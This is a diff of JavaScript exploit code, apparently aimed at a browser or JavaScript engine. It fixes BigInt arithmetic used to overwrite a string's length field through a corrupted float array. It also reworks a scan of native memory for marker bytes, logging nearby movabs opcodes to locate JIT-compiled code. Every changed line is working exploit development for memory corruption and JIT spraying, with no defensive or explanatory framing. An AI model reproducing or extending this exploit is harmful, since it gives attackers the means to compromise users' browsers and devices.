@@ -94,19 +94,19 @@ try{
   const eb=new Uint8Array(0x40);eb.fill(0x41);
   const es=dec.decode(eb);
   objB[4]=es;
-  const esAddr=Number(f2i(m[OB+2])&0xffffffffn);
+  const esAddrBI=f2i(m[OB+2])&0xffffffffn;
   objB[4]=marker;
-  log("ESA:"+esAddr.toString(16));
-  const BASE=0x1080018;
-  const esR=(esAddr&0xFFFFFFFE);
-  const tq=esR+8-1; // length field at obj+8
-  const off=tq-BASE;
-  if(off>=0){
-    const idx=Math.floor(off/8);
-    if(off%8===0){
+  log("ESA:"+esAddrBI.toString(16));
+  // ES length corruption — proven p46 approach with BigInt
+  const tq=(esAddrBI-1n)+8n;
+  const off2b=tq-0x1080018n;
+  if(off2b>0n&&off2b<0x400000n){
+    if((off2b&7n)===0n){
+      const idx=Number(off2b>>3n);
       const v=f2i(m[idx]);
       m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
     }else{
+      const idx=Number((off2b-4n)>>3n);
       const a=f2i(m[idx]);
       m[idx]=i2f((0x01200000n<<32n)|(a&0xffffffffn));
     }
@@ -115,25 +115,22 @@ try{
       // Scan for 0x41414141 pattern (marker M1) in native memory
       // Each charCode is a byte (windows-1252)
       let found=[];
-      for(let off2=0;off2<Math.min(es.length,0x800000);off2+=4){
-        if(es.charCodeAt(off2)===0x41&&es.charCodeAt(off2+1)===0x41&&
-           es.charCodeAt(off2+2)===0x41&&es.charCodeAt(off2+3)===0x41){
-          // Check full 8-byte pattern
-          let all41=true;
-          for(let b=0;b<8;b++){if(es.charCodeAt(off2+b)!==0x41){all41=false;break;}}
-          if(all41){
-            // Check if M2 (0x42424242...) is nearby
-            for(let d=8;d<40;d++){
-              let all42=true;
-              for(let b=0;b<8;b++){if(es.charCodeAt(off2+d+b)!==0x42){all42=false;break;}}
-              if(all42){
-                found.push(off2+":gap="+d);
-                break;
-              }
-            }
-            if(found.length>=3)break;
+      for(let p=0x40;p<Math.min(es.length,0x800000);p+=1){
+        let all41=true;
+        for(let b=0;b<8;b++){if(es.charCodeAt(p+b)!==0x41){all41=false;break;}}
+        if(!all41)continue;
+        // Found M1! Log 2 bytes before (movabs opcode: 48 B8 or 49 BA etc)
+        const pre=es.charCodeAt(p-2).toString(16).padStart(2,"0")+es.charCodeAt(p-1).toString(16).padStart(2,"0");
+        // Search for M2 nearby
+        for(let d=10;d<50;d++){
+          let all42=true;
+          for(let b=0;b<8;b++){if(es.charCodeAt(p+d+b)!==0x42){all42=false;break;}}
+          if(all42){
+            found.push(p.toString(16)+":pre="+pre+":gap="+d);
+            break;
           }
         }
+        if(found.length>=3)break;
       }
       log("JIT:"+found.join(","));
     }
